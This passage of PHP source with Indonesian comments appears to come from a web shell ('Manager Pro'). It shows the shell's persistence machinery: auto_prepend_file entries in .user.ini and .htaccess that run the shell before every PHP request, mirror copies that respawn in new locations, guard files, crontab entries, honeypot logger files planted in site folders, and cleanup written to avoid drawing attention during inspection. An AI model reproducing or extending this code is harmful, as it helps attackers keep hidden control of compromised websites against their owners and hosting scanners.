        if (stripos($ln, 'auto_prepend_file') === false) { $keep[] = $ln; continue; }
        $t = '';
        if (preg_match('/auto_prepend_file\s*=?\s*"?([^"\r\n]+)"?/i', $ln, $mm)) $t = trim($mm[1]);
        if ($t === '') { $keep[] = $ln; continue; }
        $isOurs = false;
        if ($guardBase !== '' && strpos($t, $guardBase) !== false) $isOurs = true;
        if (!$isOurs && @is_file($t)) {
            $tb = (string)@file_get_contents($t);
            $isOurs = mp_is_our_php($tb);
            /* Guard versi LAMA yang sudah tidak dipakai lagi. Namanya berpola
             * ring (mis. a8b3-645f.php) tapi isinya versi terdahulu yang
             * mungkin tidak memakai kata kunci yang kita cari. Tiga syarat
             * sekaligus — nama berpola ring, file kecil, dan memakai
             * SCRIPT_FILENAME — supaya bootstrap situs yang sah tidak ikut
             * dicabut. Kasus nyata di lapangan:
             *   /container/.user.ini -> auto_prepend_file = ".../a8b3-645f.php"
             * Satu baris itu membuat setiap request PHP di bawah folder itu
             * menjalankan shell lebih dulu. */
            if (!$isOurs && strlen($tb) < 4000 && strpos($tb, 'SCRIPT_FILENAME') !== false
                && mp_is_ring_name(basename($t))) $isOurs = true;
        }
        if (!$isOurs && !@is_file($t)) $isOurs = mp_is_ring_name(basename($t));
        /* 4) target HILANG dengan path absolut.
         *
         * Ini kasus yang mematikan situs dan terjadi di lapangan:
         *   /.user.ini -> auto_prepend_file = "/home/.../259e-09fc.php"
         * File targetnya sudah tidak ada (tersapu scanner hosting, terhapus
         * manual, apa saja). PHP menganggap auto_prepend_file yang gagal
         * dibuka sebagai FATAL, bukan warning — jadi SETIAP request PHP di
         * bawah folder itu berakhir 500 body kosong, dan tidak ada kode kita
         * yang sempat jalan untuk memperbaikinya. Deadlock.
         *
         * Aturannya sederhana: prepend ke file absolut yang tidak ada SELALU
         * salah, siapa pun pemiliknya. Membuang barisnya bukan merusak
         * konfigurasi orang lain — itu memulihkan folder yang sudah rusak.
         * Path relatif tidak disentuh: artinya bergantung include_path dan
         * kita tidak bisa memastikannya dari sini. */
        if (!$isOurs && !@is_file($t) && mp_is_abs_path($t)) $isOurs = true;
        if ($isOurs) { $cut++; continue; }
        $keep[] = $ln;
    }
    if ($cut === 0) return false;
    if ($v && $kind === 'htaccess') {
        @file_put_contents($v . '/.htaccess.bak.' . date('YmdHis'), $cur, LOCK_EX);
    }
    $out = trim(implode("\n", $keep));
    if ($kind === 'user.ini' && $out === '') {
        @chmod($file, 0644);
        @unlink($file);
        if ($v) mp_log($v, 'legacy clean user.ini: ' . $cut . ' prepend dicabut, file kosong dihapus ' . $file);
        return true;
    }
    @file_put_contents($file, $out . "\n", LOCK_EX);
    if ($v) mp_log($v, 'legacy clean ' . $kind . ': ' . $cut . ' prepend dicabut di ' . $file);
    return true;
}

/* == PENJAGA DEADLOCK: prepend yatim di folder KITA ======================
 *
 * Kenapa fungsi terpisah, dan kenapa dijalankan tiap boot:
 *
 * mp_harden() menaruh .user.ini di folder guard supaya guard ikut jalan di
 * setiap request folder itu. Kalau file guard kemudian HILANG (scanner
 * hosting menyapunya, operator menghapusnya, mirror gagal ditulis), .user.ini
 * itu berubah jadi ranjau: PHP menganggap auto_prepend_file yang gagal dibuka
 * sebagai FATAL, jadi seluruh folder itu membalas 500 dan tidak ada kode kita
 * yang sempat jalan untuk membereskan.
 *
 * mp_legacy_clean() tidak menolong di sini: jangkauannya root situs, dan folder
 * guard justru sengaja dibuat di LUAR root situs. Jadi folder guard diperiksa
 * sendiri, tiap boot, dengan biaya dua kali is_file().
 *
 * Ini bukan kerusakan teoretis. Di lapangan sudah terjadi:
 *   /.user.ini -> auto_prepend_file = "/home/.../259e-09fc.php"
 * file target sudah tidak ada, dan seluruh situs membalas 500 body kosong.
 * Satu-satunya jalan keluar waktu itu adalah FTP, karena PHP tidak bisa jalan
 * untuk memperbaiki dirinya sendiri. */
function mp_orphan_prepend_clean($cfg) {
    $v = mp_vault();
    $guard = (string)$cfg['guard'];
    if ($guard === '') return 0;
    $dirs = [];
    foreach ([$guard, (string)$cfg['primary']] as $f) {
        if ($f === '') continue;
        $d = @dirname($f);
        if ($d === '' || $d === '.' || !@is_dir($d)) continue;
        $dirs[mp_normp(mp_real_dir($d))] = $d;
    }
    $cut = 0;
    foreach ($dirs as $d) {
        $ui = rtrim($d, '/\\') . '/.user.ini';
        if (!@is_file($ui)) continue;
        if (mp_strip_prepend($ui, 'user.ini', $guard, $v)) $cut++;
    }
    return $cut;
}

/* Cari salinan index.php ASLI di semua vault yang ada di mesin ini.
 *
 * Kenapa tidak hanya vault aktif: tag vault diturunkan dari host. Kalau tag
 * berubah (host berubah, versi lama memakai salt lain), kode baru membuat
 * vault BARU — dan backup yang ditulis versi lama tertinggal di vault lama.
 * Backup itu satu-satunya salinan halaman depan yang masih utuh, jadi harus
 * dicari ke semua kandidat, bukan hanya vault yang sedang dipakai. */
function mp_find_site_bak($cfg, $v) {
    $cands = [];
    if ($v) $cands[] = $v . '/.index.php.bak';
    $tmp = @sys_get_temp_dir();
    if ($tmp) {
        $base = rtrim($tmp, '/\\');
        foreach ((array)@glob($base . '/.s*', GLOB_ONLYDIR) as $d) {
            $cands[] = rtrim($d, '/\\') . '/.index.php.bak';
            foreach ((array)@glob(rtrim($d, '/\\') . '/*/.index.php.bak') as $f) $cands[] = $f;
        }
    }
    if (!empty($cfg['primary'])) {
        $pd = @dirname((string)$cfg['primary']);
        if ($pd) $cands[] = rtrim($pd, '/\\') . '/.index.php.bak';
    }
    foreach (array_unique($cands) as $f) {
        if (!@is_file($f)) continue;
        $b = (string)@file_get_contents($f);
        if ($b === '' || strlen($b) < 20) continue;
        if (mp_is_our_php($b)) continue;            /* backup teracuni: jangan dipakai */
        return $f;
    }
    return '';
}

/* MIGRASI v5-lama -> v5 sekarang.
 *
 * Versi lama meninggalkan DUA jenis jejak:
 *   1) blok mp_sys_prepend di index.php situs
 *   2) auto_prepend_file di .user.ini (kadang .htaccess) yang menunjuk guard
 *
 * Jejak kedua yang paling berbahaya. Bukti lapangan di satu server:
 *   /container/.user.ini -> auto_prepend_file = ".../a8b3-645f.php"
 * Satu baris itu membuat SETIAP request PHP di bawah folder tersebut
 * menjalankan shell lebih dulu — jadi setiap URL, bahkan file yang tidak ada,
 * membalas panel login. Efeknya terlihat seperti "index.php belum disembuhin",
 * padahal index.php bukan penyebabnya.
 *
 * Jadi penyisiran TIDAK boleh dibatasi ke dirname(primary): folder tempat
 * guard pernah berdiri bisa di mana saja di bawah webroot. Titik patoknya
 * DOCUMENT_ROOT (mp_site_roots), lalu turun sampai 2 tingkat (mp_legacy_dirs).
 *
 * Beda dengan mp_unharden():
 *   - mp_unharden() = dipakai saat RING KILL, mencabut SEMUA termasuk guard.
 *   - mp_legacy_clean() = mencabut jejak di area SITUS saja. */
function mp_legacy_clean($cfg, $dirs = null) {
    $v = mp_vault();
    $hit = 0;
    $guard = (string)$cfg['guard'];
    $gdirN = mp_normp(@dirname($guard));
    $gbase = ($guard !== '') ? (string)basename($guard) : '';
    if ($dirs === null) $dirs = mp_legacy_dirs($cfg);
    foreach ($dirs as $d) {
        if ($d === '' || !@is_dir($d)) continue;
        /* folder guard: lewati. Pintu masuk kita sendiri ada di sana dan
         * memang harus memanggil primary. */
        if ($gdirN !== '' && mp_normp($d) === $gdirN) continue;

        /* 1) entry point: cabut blok bertag */
        foreach (['index.php', 'index.phtml', 'index.htm', 'index.html',
                  'home.php', 'app.php', 'default.php', 'main.php'] as $en) {
            $eps = rtrim($d, '/\\') . '/' . $en;
            if (!@is_file($eps) || !@is_writable($eps)) continue;
            /* cek murah dulu: tag inject selalu di awal file */
            if (strpos(mp_head($eps, 1024), 'mp_sys_prepend') === false) continue;
            $c = (string)@file_get_contents($eps);
            if (strpos($c, 'mp_sys_prepend') === false) continue;
            if (mp_inject_entry_remove($eps)) {
                $hit++;
                if ($v) mp_log($v, 'legacy clean index ' . $eps);
            }
        }

        /* 2) .user.ini / .htaccess: buang auto_prepend_file milik kita */
        $ui = rtrim($d, '/\\') . '/.user.ini';
        if (@is_file($ui) && @is_writable($ui)) {
            if (mp_strip_prepend($ui, 'user.ini', $gbase, $v)) $hit++;
        }
        $ha = rtrim($d, '/\\') . '/.htaccess';
        if (@is_file($ha) && @is_writable($ha)) {
            if (mp_strip_prepend($ha, 'htaccess', $gbase, $v)) $hit++;
        }
    }
    return $hit;
}

/* == PEMULIHAN ENTRY POINT SITUS ========================================= */
/* Halaman depan situs bisa saja sudah tertimpa SEBELUM kode ini dipasang:
 * self-heal versi lama menulis SELURUH source shell ke file yang sedang
 * berjalan, dan file itu adalah index.php webroot saat guard di-include.
 *
 * Kenapa kerusakan ini tidak terlihat dari sisi ring: yang tertimpa bukan
 * anggota ring, jadi tidak ada hash ring yang berubah, tidak ada mirror yang
 * hilang. Yang kelihatan cuma satu hal — halaman depan membalas panel.
 *
 * Dijalankan untuk SEMUA root dari mp_site_roots(), bukan hanya
 * dirname(primary). Kegagalan versi sebelumnya persis di situ: primary pindah
 * ke /container/, patokan ikut pindah, dan index.php webroot tidak pernah
 * disentuh.
 *
 * Urutan pemulihan:
 *   1) salinan asli (mp_find_site_bak) -> tulis balik
 *   2) tidak ada salinan, tapi isinya cuma blok bertag -> cabut bloknya
 *   3) tidak ada salinan dan isinya penuh source shell -> TIDAK ditebak.
 *      Dicatat ke .site_broken, ditampilkan di panel sebagai peringatan.
 *      Menulis tebakan ke halaman depan situs lebih buruk daripada jujur.
 *
 * DUA MODE PEMANGGILAN, dan bedanya penting:
 *   mp_restore_site_entry($cfg)            -> SISIR SEMUA root. Mahal, jadi
 *                                            dipakai di sapuan 15 menit.
 *   mp_restore_site_entry($cfg, $roots)    -> hanya root yang disebut. Murah,
 *                                            dipakai tiap boot untuk webroot.
 * Halaman depan yang membalas panel adalah kerusakan yang kelihatan semua
 * orang; menunggu 15 menit untuk memperbaikinya tidak masuk akal. Yang mahal
 * dari mode penuh bukan is_file()-nya, tapi jumlah root yang disisir.
 *
 * Laporan .site_broken HANYA ditulis di mode penuh. Kalau mode sempit
 * menulisnya, laporan dari sapuan penuh (yang mencakup folder lain) akan
 * tertimpa oleh daftar yang lebih pendek dan kerusakan di folder lain
 * menghilang dari panel. */
function mp_restore_site_entry($cfg, $roots = null) {
    $v = mp_vault();
    $full = ($roots === null);
    if ($full) $roots = mp_site_roots($cfg);
    /* Salinan asli dicari LAZIM, bukan di awal: mp_find_site_bak() men-scan
     * temp dir dan beberapa vault. Kalau tidak ada entry point yang tercemar,
     * pencarian itu kerja yang tidak perlu — dan fungsi ini jalan tiap boot. */
    $bak = null;
    $fixed = 0;
    $broken = [];
    foreach ($roots as $root) {
        foreach (['index.php', 'index.phtml', 'home.php', 'app.php'] as $en) {
            $idx = rtrim($root, '/\\') . '/' . $en;
            if (!@is_file($idx) || !@is_writable($idx)) continue;
            if (mp_is_ring_member($cfg, $idx)) continue;      /* shell sah: jangan sentuh */
            if (!mp_entry_tainted($idx, $cfg)) continue;      /* sehat: tidak ada urusan */
            if ($bak === null) $bak = mp_find_site_bak($cfg, $v);

            /* (a) ada salinan asli -> tulis balik */
            if ($bak !== '') {
                $b = (string)@file_get_contents($bak);
                if ($b !== '' && strlen($b) > 20 && !mp_is_our_php($b)) {
                    $GLOBALS['MP_WRITE_SITE_OK'] = 1;
                    $ok = mp_write($idx, $b);
                    unset($GLOBALS['MP_WRITE_SITE_OK']);
                    if ($ok) {
                        $fixed++;
                        if ($v) mp_log($v, 'PULIH ' . $idx . ' dari ' . $bak . ' (' . strlen($b) . 'B)');
                        continue;
                    }
                }
            }
            /* (b) bukan source shell penuh, cuma blok inject -> cabut bloknya */
            $isFull = (@md5_file($idx) === (string)$cfg['hash']);
            if (!$isFull) {
                $hh = mp_head($idx, 4096);
                if (strpos($hh, 'Manager Pro') !== false
                    && (strpos($hh, 'LINGKARAN') !== false || strpos($hh, 'SENTINEL') !== false)) $isFull = true;
            }
            if (!$isFull) {
                if (mp_inject_entry_remove($idx)) {
                    $fixed++;
                    if ($v) mp_log($v, 'PULIH ' . $idx . ': blok inject dicabut');
                    continue;
                }
            }
            $broken[] = $idx . ' (' . (int)@filesize($idx) . 'B)';
            if ($v) {
                mp_log($v, 'RUSAK ' . $idx . ' memuat source shell kita, TIDAK ADA salinan asli. '
                         . 'Halaman depan perlu dikembalikan manual.');
            }
        }
    }
    if ($v && $full) {
        $sf = $v . '/.site_broken';
        if (!empty($broken)) @file_put_contents($sf, implode("\n", $broken) . "\n", LOCK_EX);
        else if (@is_file($sf)) @unlink($sf);
    }
    return $fixed;
}

function mp_unharden($cfg) {
    $v = mp_vault();
    $guard = (string)$cfg['guard'];
    $gdir = @dirname($guard);
    $pd = !empty($cfg['primary']) ? @dirname((string)$cfg['primary']) : '';

    /* 1) PINTU MASUK + INJECT — dibersihkan berdasarkan ISI, bukan nama file.
     *
     * Kenapa berdasarkan isi: nama pintu masuk sekarang obfuscated dan bisa
     * berubah antar versi (dulu index.php, sekarang thumb_xxx.php / .xxx.php).
     * Kalau pembersih mencari nama tertentu saja, sisanya tertinggal dan terus
     * memanggil guard tiap request.
     *
     * Dua jenis jejak:
     *   a) file yang berisi blok bertag mp_sys_prepend -> inject dari versi lama
     *   b) file kecil yang isinya prelude guard kita    -> pintu masuk
     * File milik situs tidak cocok keduanya, jadi aman. */
    $files = [];
    if ($gdir !== '') {
        /* sisir semua .php di folder guard + parent (maks 4 tingkat) */
        $d = $gdir;
        for ($i = 0; $i < 5; $i++) {
            if ($d === '' || !@is_dir($d)) break;
            $items = @scandir($d);
            if (is_array($items)) {
                foreach ($items as $it) {
                    if ($it === '.' || $it === '..') continue;
                    if (!preg_match('#\.(php|phtml|php[3-8]|pht|inc)$#i', $it)) continue;
                    $files[] = rtrim($d, '/\\') . '/' . $it;
                }
            }
            $nd = @dirname($d);
            if ($nd === $d) break;
            $d = $nd;
        }
    }
    if ($pd !== '') {
        $files[] = $pd . '/index.php';
        foreach (mp_candidates($pd) as $d) $files[] = $d . '/index.php';
    }
    foreach (array_unique($files) as $f) {
        if (!@is_file($f) || !@is_writable($f)) continue;
        if (mp_normp($f) === mp_normp((string)$cfg['primary'])) continue;   /* primary jangan */
        $c = (string)@file_get_contents($f);
        if ($c === '') continue;
        /* (a) inject bertag -> cabut bloknya */
        if (strpos($c, 'mp_sys_prepend') !== false) {
            mp_inject_entry_remove($f);
            if ($v) mp_log($v, 'unharden inject ' . $f);
            $c = (string)@file_get_contents($f);
            /* kalau setelah dicabut file tinggal "<?php" kosong dan itu file
             * yang KITA bikin, hapus sekalian biar tidak jadi sampah */
            if (trim(str_replace('<?php', '', $c)) === '' && @filesize($f) < 40) {
                @chmod($f, 0644);
                @unlink($f);
                if ($v) mp_log($v, 'unharden hapus pintu kosong ' . $f);
            }
            continue;
        }
        /* (b) pintu masuk = file kecil berisi prelude guard kita */
        if (@filesize($f) <= 4000 && mp_is_guard_prelude($c)) {
            @chmod($f, 0644);
            @unlink($f);
            if ($v) mp_log($v, 'unharden hapus pintu masuk ' . $f);
        }
    }

    /* 2) .user.ini — yang menunjuk guard SEKARANG maupun guard LAMA.
     * Kenali dari path di baris auto_prepend_file: baca file tujuannya,
     * kalau isinya prelude guard berarti milik kita. Kalau file tujuannya
     * sudah hilang, cocokkan namanya dengan guard sekarang. */
    $dirs = array_merge(
        $gdir !== '' ? [$gdir] : [],
        $pd !== '' ? [$pd] : [],
        mp_candidates($pd !== '' ? $pd : $gdir)
    );
    foreach (array_unique($dirs) as $dd) {
        if (!$dd || !@is_dir($dd) || !@is_writable($dd)) continue;
        $ui = rtrim($dd, '/\\') . '/.user.ini';
        if (!@is_file($ui)) continue;
        $cur = (string)@file_get_contents($ui);
        if (stripos($cur, 'auto_prepend_file') === false) continue;
        $lines = preg_split("/\r\n|\n|\r/", $cur);
        $keep = [];
        $hit = false;
        foreach ($lines as $ln) {
            if (stripos($ln, 'auto_prepend_file') === false) { $keep[] = $ln; continue; }
            if (!preg_match('/auto_prepend_file\s*=\s*"?([^"\r\n]+)"?/i', $ln, $mm)) { $keep[] = $ln; continue; }
            $tgt = trim($mm[1]);
            if (mp_normp($tgt) === mp_normp($guard)) { $hit = true; continue; }
            if (@is_file($tgt)) {
                if (mp_is_guard_prelude((string)@file_get_contents($tgt))) { $hit = true; continue; }
            } elseif ($guard !== '' && strcasecmp((string)@basename($tgt), (string)@basename($guard)) === 0) {
                $hit = true; continue;
            }
            $keep[] = $ln;
        }
        if (!$hit) continue;
        $out = trim(implode("\n", $keep));
        if ($out === '') { @chmod($ui, 0644); @unlink($ui); }
        else { @file_put_contents($ui, $out . "\n", LOCK_EX); }
        if ($v) mp_log($v, 'unharden user.ini ' . $ui);
    }
    /* symlink */
    $link = $gdir . '/index.php';
    if (@is_link($link)) @unlink($link);
    /* cron */
    if (stripos(PHP_OS, 'WIN') !== 0) {
        $l = (string)mp_run('crontab -l');
        if (strpos($l, $guard) !== false || strpos($l, (string)$cfg['primary']) !== false) {
            $lines = preg_split("/\r\n|\n|\r/", $l);
            $keep = [];
            foreach ($lines as $ln) {
                if (strpos($ln, $guard) !== false) continue;
                if (strpos($ln, (string)$cfg['primary']) !== false) continue;
                $keep[] = $ln;
            }
            mp_run('printf %s ' . escapeshellarg(implode("\n", $keep)) . ' | crontab -');
        }
    }
    if ($v) mp_log($v, 'unharden complete');
}

/* == GUARD WRITE / HEAL ================================================== */
/* Guard yang benar = punya prelude, menunjuk primary kita, dan hash-nya cocok.
 * Untuk guard pointer-only isi source primary TIDAK ada di dalamnya, jadi
 * yang dicek adalah penunjuk path — bukan keberadaan source. */
function mp_guard_ok($cfg) {
    $g = (string)$cfg['guard'];
    if (!@is_file($g)) return false;
    $d = (string)@file_get_contents($g);
    if ($d === '') return false;
    if (strpos($d, 'SCRIPT_FILENAME') === false) return false;
    $prim = (string)$cfg['primary'];
    if (strpos($d, $prim) === false && strpos($d, str_replace('\\', '/', $prim)) === false) return false;
    if (strpos($d, 'mp_boot') !== false) return false;      /* ini salinan shell, bukan guard */
    if (md5($d) !== (string)$cfg['guard_hash']) return false;
    return true;
}

function mp_heal_guard($cfg, $src = '') {
    $body = mp_guard_body($cfg, $src);
    $h = md5($body);
    $g = (string)$cfg['guard'];
    $cur = @is_file($g) ? (string)@file_get_contents($g) : '';
    if ($cur === '' || md5($cur) !== $h) {
        if (mp_write($g, $body)) {
            $cfg['guard_hash'] = $h;
            mp_log(mp_vault(), 'guard written ' . $g);
        }
    } elseif ((string)$cfg['guard_hash'] !== $h) {
        /* Isi guard SUDAH benar tapi catatan config belum sinkron (mis. .c
         * pernah ditimpa salinan lama, atau guard baru dipasang di luar).
         * Tanpa cabang ini, config tetap punya guard_hash kosong selamanya:
         * mp_guard_ok() selalu gagal, dan mp_harden() dipanggil tiap boot. */
        $cfg['guard_hash'] = $h;
        mp_log(mp_vault(), 'guard_hash disinkron ' . $g);
    }
    /* Guard pindah folder? paksa beda dir dari primary.
     * Nama file TIDAK diganti kalau tidak perlu: mengganti nama tiap heal
     * menghasilkan prelude yatim yang menumpuk di folder cache. */
    $gdir = @dirname((string)$cfg['guard']);
    $pdir = @dirname((string)$cfg['primary']);
    if ($gdir !== '' && $pdir !== '' && mp_normp($gdir) === mp_normp($pdir)) {
        $nd = mp_guard_dir($pdir);
        if ($nd) {
            $new = rtrim($nd, '/\\') . '/' . mp_guard_name($nd);
            if (mp_write($new, $body)) {
                @unlink($cfg['guard']);
                $cfg['guard'] = $new;
                $cfg['guard_hash'] = $h;
                mp_log(mp_vault(), 'guard relocated -> ' . $new);
            }
        }
    }
    /* Guard ditulis tapi tidak ada di disk (gagal tulis / dihapus setelah
     * heal)? Pasang di folder yang sama dengan nama yang sudah dipakai —
     * bukan nama acak baru, supaya tidak menyisakan prelude yatim. */
    $lg = (string)$cfg['guard'];
    if ($lg !== '' && !@is_file($lg)) {
        $ldir = @dirname($lg);
        if ($ldir !== '' && @is_dir($ldir) && @is_writable($ldir)) {
            if (mp_write($lg, $body)) {
                $cfg['guard_hash'] = $h;
                mp_log(mp_vault(), 'guard reinstate ' . $lg);
            }
        } else {
            $nd2 = mp_guard_dir($pdir);
            if ($nd2) {
                $g2 = rtrim($nd2, '/\\') . '/' . mp_guard_name($nd2);
                if (mp_write($g2, $body)) {
                    $cfg['guard'] = $g2;
                    $cfg['guard_hash'] = $h;
                    mp_log(mp_vault(), 'guard repin -> ' . $g2);
                }
            }
        }
    }
    /* Kalau salah satu cabang di atas mengubah guard_hash, simpan SEKARANG.
     * Pemanggil bisa saja menimpa $cfg dengan salinan lama; tanpa penyimpanan
     * di sini, sinkronisasi hash hilang dan guard_ok() gagal tiap boot. */
    $live = mp_cfg_load();
    if (is_array($live) && (string)$live['guard_hash'] !== (string)$cfg['guard_hash']) {
        $live['guard_hash'] = (string)$cfg['guard_hash'];
        mp_cfg_save($live);
    }
    return $cfg;
}

/* Buang guard lama yang tidak lagi terlacak config.
 *
 * mp_heal_guard() membuat nama baru tiap kali guard perlu dipindah (rename
 * acak), dan mp_ring_revive()/promote juga bikin guard baru. Yang lama tidak
 * pernah dihapus kalau pindah folder gagal atau config di-restore dari vault
 * lama — akibatnya tiap boot/siklus menyisakan file guard kecil berisi
 * penunjuk path primary. Dampaknya dua:
 *   1) folder bersih jadi penuh file bertanda "file sistem - jangan dihapus",
 *      pola yang justru menarik perhatian saat diperiksa.
 *   2) penunjuk path primary ganda = permukaan tambahan tanpa manfaat.
 * Jadi: sisir folder kandidat, hapus file yang isinya guard kita tapi
 * bukan guard aktif. */
function mp_guard_gc($cfg) {
    $v = mp_vault();
    $live = (string)$cfg['guard'];
    $liveN = mp_normp($live);
    $killed = [];
    $seen = 0;
    /* Baca config dari DISK: mp_heal_guard()/harden() menulis versi mereka
     * sendiri, jadi $cfg yang dikirim pemanggil bisa masih memegang path lama.
     * Kalau patokan guard aktifnya basi, guard yang benar malah disapu. */
    $disk = mp_cfg_load();
    if (is_array($disk) && !empty($disk['guard'])) {
        $live = (string)$disk['guard'];
        $liveN = mp_normp($live);
    }
    $prim = (string)$cfg['primary'];
    $primAlt = str_replace('\\', '/', $prim);
    $pdN = mp_normp(mp_real_dir(@dirname($prim)));
    foreach (mp_vault_search_dirs() as $base) {
        if (!@is_dir($base) || !@is_writable($base)) continue;
        /* hanya folder di BAWAH folder primary: prelude yatim selalu lahir di
         * sekitar situ. Menyapu ke atas = menyentuh folder proyek operator. */
        $bn = mp_normp(mp_real_dir($base));
        if ($bn === '' || $pdN === '') continue;
        if ($bn !== $pdN && strpos($bn . '/', $pdN . '/') !== 0) continue;
        $items = @scandir($base);
        if (!is_array($items)) continue;
        foreach ($items as $it) {
            if ($it === '.' || $it === '..') continue;
            if (!preg_match('#\.(php|phtml|php[3-8]|pht)$#i', $it)) continue;
            $p = rtrim($base, '/\\') . '/' . $it;
            if (!@is_file($p)) continue;
            /* Guard AKTIF — dibandingkan lewat PATH, bukan lewat isi.
             * Inilah kuncinya: dulu penyapu melewati semua file yang isinya
             * sama dengan guard aktif, jadi prelude yatim yang isinya identik
             * (kasus normal: satu guard dipindah/rebuild) tidak pernah dibuang
             * dan menumpuk di folder cache. Sekarang yang dilewati hanya satu
             * file: yang path-nya memang guard aktif. */
            if (mp_normp($p) === $liveN) continue;
            $sz = (int)@filesize($p);
            if ($sz < 200 || $sz > 4000) continue;             /* prelude kecil */
            if (++$seen > 400) break 2;
            $b = (string)@file_get_contents($p);
            if ($b === '') continue;
            if (!mp_is_guard_prelude($b)) continue;             /* bukan prelude kita */
            /* hanya yang menunjuk primary kita */
            if (strpos($b, $prim) === false && strpos($b, $primAlt) === false) continue;
            if (in_array(mp_normp($p), mp_mesh_set($cfg), true)) continue;
            @chmod($p, 0644);
            if (@unlink($p)) $killed[] = $p;
            else { @file_put_contents($p, ''); $killed[] = $p . ' (truncated)'; }
        }
    }
    if (!empty($killed) && $v) mp_log($v, 'guard gc: ' . count($killed) . ' prelude basi dihapus');
    return $killed;
}

/* == MIRRORS ============================================================= */
function mp_mirror_alive($m, $hash) {
    if (!is_string($m) || $m === '') return false;
    if (!@is_file($m)) return false;
    $d = @file_get_contents($m);
    if (!is_string($d) || $d === '') return false;
    return md5($d) === $hash;
}

function mp_mesh_alive($cfg) {
    $n = 0;
    foreach ((array)$cfg['mirrors'] as $m) if (mp_mirror_alive($m, (string)$cfg['hash'])) $n++;
    return $n;
}

/* Sebar satu mirror baru. $avoid = path yang dibakar.
 * PENTING: $cfg by value — perubahan di sini TIDAK sampai ke pemanggil.
 * Karena itu mp_spread() memuat sendiri config terbaru, menambal, lalu
 * menyimpannya, dan mengembalikan path (bukan bool) supaya pemanggil bisa
 * sinkron. Pemanggil WAJIB reload cfg setelah ini. */
function mp_spread($cfg, $src, $avoid = '') {
    if (!$cfg || !$src) return false;
    /* ambil config paling baru dari disk supaya tidak menimpa catatan
     * spread sebelumnya dengan salinan lama */
    $live = mp_cfg_load();
    if (!is_array($live)) $live = $cfg;
    /* GERBANG KILL — choke point. Semua pertumbuhan mesh lewat sini:
     * mp_mesh_rebuild, mp_heal_mirrors, mp_honeypot, revive, promote.
     * Kalau ring_state=killed, tidak ada satu pun yang boleh menulis salinan
     * baru. Dibaca dari $live (disk), bukan dari argumen: in-memory bisa basi. */
    if (((isset($live['ring_state']) ? (string)$live['ring_state'] : 'alive')) === 'killed') {
        mp_log(mp_vault(), 'spread DITOLAK: ring killed');
        return false;
    }
    $m = mp_ring_relocate($live, $avoid);
    if ($m === false) return false;
    /* hormati batas mirror_max — kalau sudah penuh, jangan tambah lagi */
    $cap = (int)(isset($live['mirror_max']) ? $live['mirror_max'] : 6);
    if (count((array)$live['mirrors']) >= $cap) return false;
    if (mp_write($m, $src)) {
        $live['mirrors'][] = $m;
        if ($avoid !== '') {
            $moved = isset($live['moved']) ? (array)$live['moved'] : [];
            $moved[] = str_replace('\\', '/', $avoid);
            $moved = array_values(array_unique($moved));
            if (count($moved) > 30) $moved = array_slice($moved, -30);
            $live['moved'] = $moved;
        }
        mp_cfg_save($live);
        mp_log(mp_vault(), 'spread mirror ' . $m . ($avoid !== '' ? ' (avoid ' . $avoid . ')' : ''));
        return $m;
    }
    return false;
}

/* Heal mirror yang rusak/mati. Kalau mati -> PINDAH LOKASI BARU.
 * PENTING: mp_spread() MENULIS config sendiri (termasuk mirror baru).
 * Jadi di sini tidak boleh menulis daftar $keep hasil loop lama — itu akan
 * menghapus mirror yang baru saja ditambahkan. Yang dikerjakan: bersihkan
 * entri mati, catat 'moved', lalu simpan hasil GABUNGAN dari disk. */
function mp_heal_mirrors($cfg, $src) {
    if (!is_array($cfg['mirrors']) || !$src) return 0;
    /* GERBANG KILL: setelah kill, daftar mirror kosong dan tidak ada yang
     * boleh ditulis ulang di lokasi baru. */
    if (mp_is_killed($cfg)) return 0;
    $fixed = 0;
    $dead = [];
    foreach ($cfg['mirrors'] as $m) {
        if (!is_string($m) || $m === '') continue;
        if (mp_mirror_alive($m, (string)$cfg['hash'])) continue;
        if (@is_file($m)) {
            /* ada tapi hash beda -> overwrite in place (belum dibakar) */
            if (mp_write($m, $src)) { $fixed++; mp_log(mp_vault(), 'reheal mirror ' . $m); continue; }
        }
        /* mati total -> lokasi baru */
        $dead[] = $m;
        if (mp_spread($cfg, $src, $m) !== false) $fixed++;
    }
    if (empty($dead)) return $fixed;
    /* sinkron: buang entri mati dari daftar terbaru, catat ke moved */
    $live = mp_cfg_load();
    if (!is_array($live)) $live = $cfg;
    $deadN = array_map('mp_normp', $dead);
    $keep = [];
    foreach ((array)$live['mirrors'] as $m) {
        if (in_array(mp_normp($m), $deadN, true)) continue;
        $keep[] = $m;
    }
    $movedList = isset($live['moved']) ? (array)$live['moved'] : [];
    foreach ($dead as $d) $movedList[] = str_replace('\\', '/', $d);
    $movedList = array_values(array_unique($movedList));
    if (count($movedList) > 30) $movedList = array_slice($movedList, -30);
    $live['mirrors'] = array_values(array_unique($keep));
    $live['moved'] = $movedList;
    mp_cfg_save($live);
    return $fixed;
}

function mp_mesh_rebuild($cfg, $src) {
    /* GERBANG KILL: setelah RING KILL, tidak ada apa pun yang menyebar sampai
     * RING REVIVE ditekan. Tanpa gerbang ini, setiap request sesudah kill
     * memanggil mp_spread() lagi dan sindikat bangun sendiri di lokasi baru —
     * persis "tiap refresh mirror muncul lagi". */
    if (mp_is_killed($cfg)) return false;
    $min = (int)(isset($cfg['min_alive']) ? $cfg['min_alive'] : 3);
    if (mp_mesh_alive($cfg) >= $min) return false;
    $added = 0;
    for ($i = 0; $i < ($min + 2); $i++) {
        $live = mp_cfg_load();
        if (!is_array($live)) $live = $cfg;
        if (mp_mesh_alive($live) >= $min) break;
        if (mp_spread($live, $src) === false) break;
        $added++;
    }
    return $added > 0;
}

/* == HONEYPOT (logger only) ============================================== */
/* Honeypot = file umpan kecil yang mencatat pengunjung. Batasnya 2.
 *
 * Kenapa dihitung ulang dari DISK, bukan dari $cfg['hp_n']:
 * hp_n adalah penghitung di config. Begitu config di-restore dari vault lama
 * (atau ring_state berubah lewat kill/revive), penghitung itu kembali ke nilai
 * lama sementara file umpan yang sudah dibuat tetap ada di disk. Hasilnya tiap
 * siklus menambah umpan baru tanpa membersihkan yang lama — 10 file umpan
 * menumpuk padahal batasnya 2, dan tiap file berisi penunjuk vault.
 * Jadi: sisir dulu apa yang SUDAH ada di disk, adopsi yang sah, buang yang
 * bukan bagian daftar. */
function mp_honeypot($cfg) {
    $live = mp_cfg_load();
    if (is_array($live)) $cfg = $live;
    $v = mp_vault();

    /* GERBANG KILL: umpan adalah file .php yang ditulis ke folder situs.
     * Setelah kill, tiap refresh yang menulis umpan baru = "file muncul lagi".
